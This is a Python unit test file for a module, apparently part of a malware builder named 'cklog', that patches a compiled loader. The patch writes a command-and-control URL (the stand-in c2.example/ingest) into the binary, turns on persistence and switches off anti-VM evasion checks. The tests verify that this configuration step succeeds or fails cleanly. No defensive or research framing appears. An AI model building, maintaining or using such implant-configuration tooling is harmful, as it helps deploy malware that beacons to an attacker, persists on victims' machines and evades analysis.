import os
import sys
import unittest

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)

from cklog import stage


def c2_array():
    return stage.C2_SENTINEL + b"\0" * (256 - len(stage.C2_SENTINEL))


def loader_bytes():
    # The real PE also retains comparison literals after the writable arrays.
    return (b"prefix" + c2_array() + b"compare" + stage.C2_SENTINEL +
            b"persist" + stage.PERSIST_SENTINEL + b"compare" + stage.PERSIST_SENTINEL +
            b"anti-vm" + stage.AV_SENTINEL + b"compare" + stage.AV_SENTINEL + b"end")


class TestPatchLoader(unittest.TestCase):
    def test_all_requested_slots_patch_once(self):
        raw = loader_bytes()
        patched, status = stage.patch_loader(
            raw, "https://c2.example:9443/ingest", persist=True, no_anti_vm=True)

        self.assertTrue(status["ok"])
        self.assertEqual(status["errors"], [])
        self.assertEqual(status["c2"], "patched")
        self.assertEqual(status["persist"], "patched")
        self.assertEqual(status["anti_vm"], "patched")
        self.assertEqual(len(patched), len(raw))
        self.assertEqual(patched[6:6 + 256].rstrip(b"\0"),
                         b"https://c2.example:9443/ingest")
        self.assertEqual(patched.count(stage.C2_SENTINEL), 1)
        self.assertEqual(patched.count(stage.PERSIST_ENABLE), 1)
        self.assertEqual(patched.count(stage.PERSIST_SENTINEL), 1)
        self.assertEqual(patched.count(stage.AV_DISABLE), 1)
        self.assertEqual(patched.count(stage.AV_SENTINEL), 1)

    def test_missing_c2_slot_is_a_strict_failure(self):
        raw = b"loader without a c2 array"
        patched, status = stage.patch_loader(raw, "http://c2.example:8080/")
        self.assertEqual(patched, raw)
        self.assertFalse(status["ok"])
        self.assertEqual(status["c2"], "failed")
        self.assertIn("C2", status["errors"][0])

    def test_ambiguous_c2_slots_are_rejected(self):
        raw = c2_array() + b"between" + c2_array()
        patched, status = stage.patch_loader(raw, "http://c2.example:8080/")
        self.assertEqual(patched, raw)
        self.assertFalse(status["ok"])
        self.assertIn("exactly one", status["errors"][0])

    def test_long_or_multibyte_c2_never_silently_truncates(self):
        for url in ("https://example/" + "a" * 256,
                    "https://example/" + "é" * 128):
            with self.subTest(url=url):
                raw = loader_bytes()
                patched, status = stage.patch_loader(raw, url)
                self.assertEqual(patched, raw)
                self.assertFalse(status["ok"])
                self.assertIn("255 UTF-8 bytes", status["errors"][0])

    def test_missing_requested_flag_is_a_strict_failure(self):
        raw = loader_bytes().replace(stage.PERSIST_SENTINEL, b"CKPRxxxx")
        patched, status = stage.patch_loader(raw, "", persist=True)
        self.assertEqual(patched, raw)
        self.assertFalse(status["ok"])
        self.assertEqual(status["persist"], "failed")

    def test_already_patched_flag_does_not_patch_comparison_literal(self):
        raw = stage.PERSIST_ENABLE + b"compare" + stage.PERSIST_SENTINEL
        patched, status = stage.patch_loader(raw, "", persist=True)
        self.assertEqual(patched, raw)
        self.assertFalse(status["ok"])
        self.assertEqual(status["persist"], "failed")

    def test_unrequested_missing_slots_are_skipped(self):
        raw = b"plain loader"
        patched, status = stage.patch_loader(raw, "")
        self.assertEqual(patched, raw)
        self.assertTrue(status["ok"])
        self.assertEqual(status["c2"], "skipped")
        self.assertEqual(status["persist"], "skipped")
        self.assertEqual(status["anti_vm"], "skipped")


if __name__ == "__main__":
    unittest.main()
